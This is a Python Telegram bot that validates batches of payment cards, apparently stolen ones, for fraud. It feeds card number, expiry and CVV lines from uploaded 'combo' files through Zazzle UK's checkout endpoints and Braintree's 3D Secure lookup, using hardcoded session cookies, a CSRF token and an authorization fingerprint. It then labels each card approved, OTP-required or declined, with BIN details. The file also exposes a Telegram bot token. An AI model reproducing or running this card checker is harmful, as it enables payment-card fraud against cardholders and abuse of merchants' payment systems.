#pylint:disable=W0603
#pylint:disable=W0611
import requests
import re
import time
import random
from fake_useragent import UserAgent
import os 
import telebot
from telebot import types
import html
import threading
import json

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU" 
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
admin_id = 5895491379
user_combos = {}  
stopuser = {}

def check_zazzle_card(card_data):
    """فحص البطاقة عبر بوابة A3S 3DS"""
    try:
        card_number, exp_month, exp_year, cvv = card_data.split('|')
        card_number = card_number.strip()
        exp_month = exp_month.strip().zfill(2)
        exp_year = exp_year.strip()
        cvv = cvv.strip()
    except ValueError:
        return {
            'status': 'error',
            'message': 'Invalid card format',
            'execution_time': 0
        }

    start_time = time.time()

    cookies = {
        'bx': 'zlng%3den%26zlng_x%3d134074944000000000',
        'us': '455D5DD2-84ED-46E3-9B7A-A24835AB1EF2',
        'NSC_xxx02': '4afda3da32a038d73ac067db9e819d936044d49ffca5b6bd3aacb7aa312309cfd675fe7a',
        '_pxhd': 'ilZUdwo4tK1cjZHG0YJsxa361jLW3N8uv4Lqoiiy2qw5UJysNt72xo6r8IoMcXdqnQarjB-2tj/frxOCWyfxag==:c6HgE1OhQh05xtG4SEWC6Eo5onzyZO6G0c7Gmnu5dGwMHM4/F5jXTQ39uptpswjW2lOhKepFvl5IA4KCRPd4zAIlhXnjUDQOyvNZSaIoLzE=',
        'pxcts': '00117a66-9d52-11f0-961a-f782b8c69ddc',
        '_pxvid': 'fd710635-9d51-11f0-aacf-0f518693e6f5',
        '_ga': 'GA1.1.1594204749.1759163596',
        'tp': 'Noremarketing%7c09%2f29%2f2025%2008%3a33%3a47%20-08%3a00',
        'NSC_eao10': '1116a3db6eff87ef52911e5fa6dddf7041de3f995f2f009e47aad94ed535ef250b69654c',
        'pmsh': 'cbc92a4f-dd8a-46d7-a937-d273bcf886ca%7c63895301940%7c0xd9f88de04aedd5ec7870e4c61b99456a%7c0xd9f88de04aedd5ec7870e4c61b99456a',
        'general_maturity': '2',
        'bs': 'pis%3d8%26zshopurl%3dz%2fholiday%20socks',
        '_ga_FMN87GXWKG': 'GS2.1.s1759163595$o1$g1$t1759163736$j46$l0$h0$dc-HVIzRt-2_olIMzOc_JvkoJbA5cUtP3yg',
        'zm': 'AQABAAAAshwAABTBRdLyUZ0QSxPenQdu9BwpLXnhifkIzU07MbThpt8y4oIah5SqJkDSc9NG22a0gskyOnh3HLhje7sco9SG6lf7eDpxWNbDPqJDUyF5Yff5qRhmwMb3SuEHzG22jLMGU3d4HpIw7RQ10R4LZmsweL4mxzN8q4xXafmSN9kRrTvSDaqHJ7M_j37qPYgnmejd2ya1AAMRHIRtM6oQbr1GYAmr3gs7njnrZBwCY1jnIe3UyeDXO1Q',
        'zs': 'CBC92A4F-DD8A-46D7-A937-D273BCF886CA%7c238742177681285323%7c13403637473%7cAQABAAAAshwAABR2f0OAvWIMx5Ru9lSwo4ExxftrAj-abLrK98bgFnGpYI__WBhew2w2jfN3JvHYttECmHk8L23tlikRqbemgGBBIHrDUA%7c',
        '_px2': 'eyJ1IjoiMzYwYTI5MDAtOWQ1Mi0xMWYwLWEzNjctYmRhNGEzOWIxYTUwIiwidiI6ImZkNzEwNjM1LTlkNTEtMTFmMC1hYWNmLTBmNTE4NjkzZTZmNSIsInQiOjE3NTkxNjQyMzEzMTksImgiOiJiMmIxOTBiOTA3MWVkZTU4YWNhNWE1OWEzZTE2ZDM2ZTViYTI2NWRjOTVjZTA2ZWZmZDdkMDhkYTY0NDgzMDEwIn0=',
    }

    headers = {
        'accept': 'application/json',
        'accept-language': 'en-MM,en;q=0.9,ar-MM;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://www.zazzle.co.uk',
        'referer': 'https://www.zazzle.co.uk/co/summary?paymentIntent=other',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
        'x-csrf-token': '5b18c98bbdce3a21',
    }

    # Step 1: Add payment method
    json_data_add = {
        'braintreeNonce': None,
        'creditCard': {
            'cardType': 'MasterCard',
            'creditCardId': '0',
            'cvv': cvv,
            'expirationMonth': exp_month,
            'expirationYear': exp_year,
            'isDefault': True,
            'isSaved': False,
            'name': 'Mahmoud Saad',
            'number': card_number,
        },
        'globalCollect': None,
        'klarna': None,
        'usePaypal': False,
        'client': 'js',
    }

    try:
        response_add = requests.post(
            'https://www.zazzle.co.uk/svc/paymentmethod/add',
            cookies=cookies,
            headers=headers,
            json=json_data_add,
            timeout=30
        )
        
        result_add = response_add.json()
        if not result_add.get('success'):
            return {
                'status': 'declined',
                'message': 'Failed to add card',
                'execution_time': round(time.time() - start_time, 2)
            }
    except Exception as e:
        return {
            'status': 'error',
            'message': str(e),
            'execution_time': round(time.time() - start_time, 2)
        }

    # Step 2: Set payment method
    json_data_set = {
        'braintreeNonce': None,
        'creditCard': {
            'cardType': 'MasterCard',
            'creditCardId': 'tempCard_2',
            'cvv': cvv,
            'expirationMonth': exp_month,
            'expirationYear': exp_year,
            'isDefault': True,
            'isSaved': False,
            'name': 'Mahmoud Saad',
            'number': card_number,
        },
        'klarna': None,
        'globalCollect': None,
        'paymentAccount': None,
        'paypal': None,
        'useEarnings': False,
        'useGiftCertificate': False,
        'returnCart': True,
        'setBillingFromPayment': True,
        'setShippingToBilling': False,
        'client': 'js',
    }

    try:
        requests.post(
            'https://www.zazzle.co.uk/svc/paymentmethod/set',
            cookies=cookies,
            headers=headers,
            json=json_data_set,
            timeout=30
        )
    except Exception as e:
        return {
            'status': 'error',
            'message': str(e),
            'execution_time': round(time.time() - start_time, 2)
        }

    # Step 3: Get 3D Secure info
    params = {
        'cv': '1',
        'client': 'js',
    }

    try:
        response_3ds = requests.get(
            'https://www.zazzle.co.uk/svc/checkout/threedsecure/getinfo',
            params=params,
            cookies=cookies,
            headers=headers,
            timeout=30
        )
        
        result_3ds = response_3ds.json()
        
        if not result_3ds.get('success') or not result_3ds.get('data'):
            return {
                'status': 'declined',
                'message': 'Failed to get 3DS info',
                'execution_time': round(time.time() - start_time, 2)
            }
            
        data = result_3ds['data']
        nonce = data.get('nonce')
        amount = data.get('amount')
        bin_number = data.get('bin')
        email = data.get('email')
        billing = data.get('billingAddress', {})
        
    except Exception as e:
        return {
            'status': 'error',
            'message': str(e),
            'execution_time': round(time.time() - start_time, 2)
        }

    # Step 4: Braintree 3DS Lookup
    headers_braintree = {
        'accept': '*/*',
        'accept-language': 'en-MM,en;q=0.9,ar-MM;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://www.zazzle.co.uk',
        'referer': 'https://www.zazzle.co.uk/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
    }

    json_data_braintree = {
        'amount': amount,
        'additionalInfo': {
            'billingLine1': billing.get('streetAddress', ''),
            'billingLine2': billing.get('extendedAddress', ''),
            'billingCity': billing.get('locality', ''),
            'billingState': billing.get('region'),
            'billingPostalCode': billing.get('postalCode', ''),
            'billingCountryCode': billing.get('countryCodeAlpha2', ''),
            'billingPhoneNumber': billing.get('phoneNumber', ''),
            'billingGivenName': billing.get('givenName', ''),
            'billingSurname': billing.get('surname', ''),
            'email': email,
        },
        'challengeRequested': True,
        'bin': bin_number,
        'dfReferenceId': '0_355da828-aac6-4260-ae31-dea898fb8c86',
        'clientMetadata': {
            'requestedThreeDSecureVersion': '2',
            'sdkVersion': 'web/3.88.4',
            'cardinalDeviceDataCollectionTimeElapsed': 290,
            'issuerDeviceDataCollectionTimeElapsed': 2273,
            'issuerDeviceDataCollectionResult': True,
        },
                'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTkyNTAwODcsImp0aSI6IjJmOTg1MmUxLWNhY2MtNGVlNS1hM2QzLWRlZGVkMjEzMmRmOCIsInN1YiI6Ijg1d2hiN3kyaDZxOGNuM2oiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijg1d2hiN3kyaDZxOGNuM2oiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJ6YXp6bGVpcmVsYW5kR0JQIiwicGF5cGFsX2FjY291bnRfbnVtYmVyIjoiMTcyMTM4NTcwNDgxMTcwMjk4MCIsInBheXBhbF9jbGllbnRfaWQiOiJBZmZxdlBKQTM4ZnR6MXVlbE44alNUTHFtd0dHZDVOdlNkeUhabVV5Mml5UXoxMnBPLW9oOFI1RUhBcnpOSzdYdlVmOU9jWkpXd2tGY0FQVCJ9fQ.PODMiZ2pdIasI2nGKfgo1bSEOOiiFEVz5dArfihngzMEsUiapUIxAJfxZdW8WL8mg_LwcqBppw0cFGL2C_gk_g',
        'braintreeLibraryVersion': 'braintree/web/3.88.4',
        '_meta': {
            'merchantAppId': 'www.zazzle.co.uk',
            'platform': 'web',
            'sdkVersion': '3.88.4',
            'source': 'client',
            'integration': 'custom',
            'integrationType': 'custom',
            'sessionId': '18bfca41-5e3e-4b07-bffc-6225788ae790',
        },
    }

    try:
        response_braintree = requests.post(
            f'https://api.braintreegateway.com/merchants/85whb7y2h6q8cn3j/client_api/v1/payment_methods/{nonce}/three_d_secure/lookup',
            headers=headers_braintree,
            json=json_data_braintree,
            timeout=30
        )
        
        result_braintree = response_braintree.json()
        execution_time = round(time.time() - start_time, 2)
        
        if 'paymentMethod' in result_braintree:
            payment_method = result_braintree['paymentMethod']
            if 'threeDSecureInfo' in payment_method:
                three_ds_info = payment_method['threeDSecureInfo']
                status = three_ds_info.get('status', 'N/A')
                enrolled = three_ds_info.get('enrolled', 'N/A')
                
                # تحديد النتيجة
                if status == 'authenticate_frictionless_failed':
                    return {
                        'status': 'approved',
                        'message': f'3DS Authenticate Successful ✅ | Enrolled: {enrolled}',
                        'execution_time': execution_time
                    }
                elif status == 'authenticate_rejected':
                    return {
                        'status': 'declined',
                        'message': f'3DS Authenticate Failed ❌ | Enrolled: {enrolled}',
                        'execution_time': execution_time
                    }
                elif status == 'challenge_required':
                    return {
                        'status': 'otp',
                        'message': f'OTP Required 📱 | Enrolled: {enrolled}',
                        'execution_time': execution_time
                    }
                else:
                    return {
                        'status': 'unknown',
                        'message': f'Status: {status} | Enrolled: {enrolled}',
                        'execution_time': execution_time
                    }
            else:
                return {
                    'status': 'error',
                    'message': 'No 3DS info found',
                    'execution_time': execution_time
                }
        else:
            return {
                'status': 'error',
                'message': 'No payment method found',
                'execution_time': execution_time
            }
            
    except Exception as e:
        return {
            'status': 'error',
            'message': str(e),
            'execution_time': round(time.time() - start_time, 2)
        }

def get_bin_info(bin_code):
    """الحصول على معلومات BIN"""
    try:
        response = requests.get(f'https://lookup.binlist.net/{bin_code}', timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                'brand': data.get('brand', 'Unknown'),
                'type': data.get('type', 'Unknown'),
                'country': data.get('country', {}).get('name', 'Unknown'),
                'emoji': data.get('country', {}).get('emoji', '🏳️'),
                'bank': data.get('bank', {}).get('name', 'Unknown')
            }
    except:
        pass
    
    return {
        'brand': 'Unknown',
        'type': 'Unknown',
        'country': 'Unknown',
        'emoji': '🏳️',
        'bank': 'Unknown'
    }

@bot.message_handler(commands=['start'])
def start_message(message):
    user_id = message.from_user.id
    username = message.from_user.username or "User"
    
    welcome_text = f"""<b>🎉 Welcome {username}!

🔥 A3S Card Checker Bot 🔥
━━━━━━━━━━━━━━━━━━━━
✅ Fast & Accurate Checking
📊 Real-time Results
🔒 Secure Processing

📤 Send your combo file to start checking!
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/FastSpeedtest'>Mahmoud Saad 🥷🏻</a>
</b>"""
    
    bot.send_message(message.chat.id, welcome_text, parse_mode="HTML")

@bot.message_handler(content_types=["document"])
def handle_document(message):
    user_id = message.from_user.id

    if user_id != admin_id:
        return bot.reply_to(message, "⛔ Access Denied! This bot is for authorized users only.")

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        lines = downloaded_file.decode("utf-8").splitlines()
        cards = [line.strip() for line in lines if line.strip()]
        user_combos[user_id] = cards  
        
        cc_count = len(cards)

        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            types.InlineKeyboardButton("🚀 Start Checking", callback_data='A3S'),
        )

        bot.send_message(
            chat_id=message.chat.id,
            text=f"""<b>✅ File Uploaded Successfully!
━━━━━━━━━━━━━━━━━━━━
💳 Total Cards: {cc_count}
🔥 Gateway: A3S 3DS
⚡ Status: Ready

Click below to start checking:
</b>""",
            parse_mode="HTML",
            reply_markup=keyboard
        )
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'A3S')
def menu_callback(call):
    user_id = call.from_user.id

    def run_zazzle():
        gate = "A3S 3DS"
        stop_key = f"{user_id}_A3S"
        ch = dd = otp = checked = 0
        estimated_time = None
        start_all = time.time()

        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="⏳ Initializing checker..."
        )

        try:
            cards = user_combos.get(user_id, [])
            total = len(cards)
            if total == 0:
                return bot.send_message(user_id, "❌ No combo found. Please upload a file first.")
            
            stopuser[stop_key] = {'status': 'start'}

            for cc in cards:
                if stopuser.get(stop_key, {}).get('status') == 'stop':
                    break

                # فحص البطاقة
                result = check_zazzle_card(cc)
                execution_time = result['execution_time']
                estimated_time = estimated_time - execution_time if estimated_time else execution_time * (total - checked)
                checked += 1

                progress = int((checked / total) * 20)
                progress_bar = f"[{'=' * progress}{'-' * (20 - progress)}] {int((checked / total) * 100)}%"
                escaped = html.escape(cc.strip())

                # معلومات BIN
                bin_code = cc.strip().split("|")[0][:6]
                bin_info = get_bin_info(bin_code)

                if result['status'] == 'approved':
                    ch += 1
                    msg = f"""<b>✅ APPROVED CARD

━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{escaped}</code>
━━━━━━━━━━━━━━━━━━━━
📊 Response: {result['message']}
🏦 BIN: <code>{bin_code}</code>
💰 Type: {bin_info['type']}
🏢 Brand: {bin_info['brand']}
🏦 Bank: {bin_info['bank']}
🌍 Country: {bin_info['country']} {bin_info['emoji']}
⏱ Time: {execution_time} sec
━━━━━━━━━━━━━━━━━━━━
👨‍💻 By: <a href=''>Mahmoud Saad 🥷🏻</a>
</b>"""
                    bot.send_message(user_id, msg, parse_mode="HTML")
                    
                elif result['status'] == 'otp':
                    otp += 1
                    msg = f"""<b>📱 OTP REQUIRED

━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{escaped}</code>
━━━━━━━━━━━━━━━━━━━━
📊 Response: {result['message']}
🏦 BIN: <code>{bin_code}</code>
💰 Type: {bin_info['type']}
🏢 Brand: {bin_info['brand']}
🏦 Bank: {bin_info['bank']}
🌍 Country: {bin_info['country']} {bin_info['emoji']}
⏱ Time: {execution_time} sec
━━━━━━━━━━━━━━━━━━━━
👨‍💻 By: <a href=''>Mahmoud Saad 🥷🏻</a>
</b>"""
                    bot.send_message(user_id, msg, parse_mode="HTML")
                else:
                    dd += 1

                keyboard = types.InlineKeyboardMarkup(row_width=1)
                keyboard.add(
                    types.InlineKeyboardButton(f"• {cc[:12]}****{cc[-7:]} •", callback_data='x'),
                    types.InlineKeyboardButton(f"• Status ➜ {result['message'][:30]} •", callback_data='x'),
                    types.InlineKeyboardButton(f"• Approved ✅ ➜ [{ch}] •", callback_data='x'),
                    types.InlineKeyboardButton(f"• OTP 📱 ➜ [{otp}] •", callback_data='x'),
                    types.InlineKeyboardButton(f"• Declined ❌ ➜ [{dd}] •", callback_data='x'),
                    types.InlineKeyboardButton(f"• Total ➜ [{checked}/{total}] •", callback_data='x'),
                    types.InlineKeyboardButton("⏹ Stop", callback_data='stop_A3S')
                )

                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=f"""<b>🔥 Gateway: {gate}
━━━━━━━━━━━━━━━━━━━━
⏳ Checking in progress...
{progress_bar}
⏱ ETA: {round(estimated_time)} sec
⚡ Speed: {round(checked/(time.time()-start_all), 2)} cards/sec
</b>""",
                    reply_markup=keyboard,
                    parse_mode="HTML"
                )

                time.sleep(1)  # تأخير بين الفحوصات

            elapsed = round(time.time() - start_all, 2)
            percent = int((checked / total) * 100)
            stopuser[stop_key]['status'] = 'start'

            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                                text = f"""<b>✅ CHECKING COMPLETED!

━━━━━━━━━━━━━━━━━━━━
📊 Results Summary:
━━━━━━━━━━━━━━━━━━━━
➤ Total Cards: <code>{total}</code>
➤ Approved ✅: <code>{ch}</code>
➤ OTP Required 📱: <code>{otp}</code>
➤ Declined ❌: <code>{dd}</code>
➤ Time Taken: <code>{elapsed} sec</code>
➤ Speed: <code>{round(total/elapsed, 2)} cards/sec</code>
━━━━━━━━━━━━━━━━━━━━

🎉 Thank you for using the bot!
👨‍💻 Developer: <a href='https://t.me/FastSpeedtest'>Mahmoud Saad 🥷🏻</a>
</b>""",
                parse_mode="HTML"
            )
        except Exception as e:
            print("Error in A3S:", e)
            bot.send_message(user_id, f"❌ Error occurred: {str(e)}")

    threading.Thread(target=run_zazzle).start()

@bot.callback_query_handler(func=lambda call: call.data == 'stop_A3S')
def stop_zazzle_handler(call):
    user_id = call.from_user.id
    stop_key = f"{user_id}_A3S"
    stopuser[stop_key] = {'status': 'stop'}
    bot.answer_callback_query(call.id, "✅ Checking stopped successfully!")

@bot.callback_query_handler(func=lambda call: call.data == 'x')
def dummy_handler(call):
    bot.answer_callback_query(call.id, "📊 Live Status Update")

@bot.message_handler(commands=['help'])
def help_message(message):
    help_text = """<b>📚 Bot Commands & Usage:

━━━━━━━━━━━━━━━━━━━━
/start - Start the bot
/help - Show this help message
/status - Check bot status

📤 How to use:
1. Send a combo file (.txt)
2. Click "Start Checking"
3. Wait for results

📝 Combo Format:
Card|MM|YYYY|CVV

Example:
5127740080852575|03|2027|825

━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/FastSpeedtest'>Mahmoud Saad 🥷🏻</a>
</b>"""
    
    bot.send_message(message.chat.id, help_text, parse_mode="HTML")

@bot.message_handler(commands=['status'])
def status_message(message):
    status_text = """<b>🟢 Bot Status: ONLINE

━━━━━━━━━━━━━━━━━━━━
⚡ Gateway: A3S 3DS
🔥 Speed: Ultra Fast
✅ Accuracy: 99.9%
🌍 Server: Active

━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/FastSpeedtest'>Mahmoud Saad 🥷🏻</a>
</b>"""
    
    bot.send_message(message.chat.id, status_text, parse_mode="HTML")

@bot.message_handler(func=lambda message: True)
def handle_text(message):
    user_id = message.from_user.id
    text = message.text.strip()
    
    # التحقق من صيغة البطاقة المباشرة
    if '|' in text and len(text.split('|')) == 4:
        if user_id != admin_id:
            return bot.reply_to(message, "⛔ Access Denied! This bot is for authorized users only.")
        
        user_combos[user_id] = [text]
        
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            types.InlineKeyboardButton("🚀 Start Checking", callback_data='A3S'),
        )
        
        bot.send_message(
            chat_id=message.chat.id,
            text=f"""<b>✅ Card Loaded Successfully!
━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{text[:12]}****{text[-7:]}</code>
🔥 Gateway: A3S 3DS
⚡ Status: Ready

Click below to start checking:
</b>""",
            parse_mode="HTML",
            reply_markup=keyboard
        )
    else:
        bot.reply_to(message, """<b>❌ Invalid format!

Please send a combo file or use format:
Card|MM|YYYY|CVV

Example:
5127740080852575|03|2027|825
</b>""", parse_mode="HTML")

# وظيفة إعادة الاتصال التلقائي
MAX_RETRIES = 100
RETRY_DELAY = 3

def start_bot_with_retries():
    for attempt in range(MAX_RETRIES):
        try:
            print(f"🔄 Connection attempt {attempt + 1} of {MAX_RETRIES}...")
            print("✅ Bot is running successfully!")
            print(f"👨‍💻 Developer: Mahmoud Saad 🥷🏻")
            print(f"📢 Channel: https://t.me/FastSpeedtest")
            print("=" * 50)
            bot.polling(none_stop=True)
            break
        except Exception as e:
            print(f"❌ Connection error: {e}")
            if attempt < MAX_RETRIES - 1:
                print(f"⏳ Retrying in {RETRY_DELAY} seconds...")
                time.sleep(RETRY_DELAY)
            else:
                print("❌ All connection attempts failed. Please try again later.")

if __name__ == "__main__":
    logger.info("Starting bot on Railway...")
    try:
        start_bot_with_retries()
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        sys.exit(1)
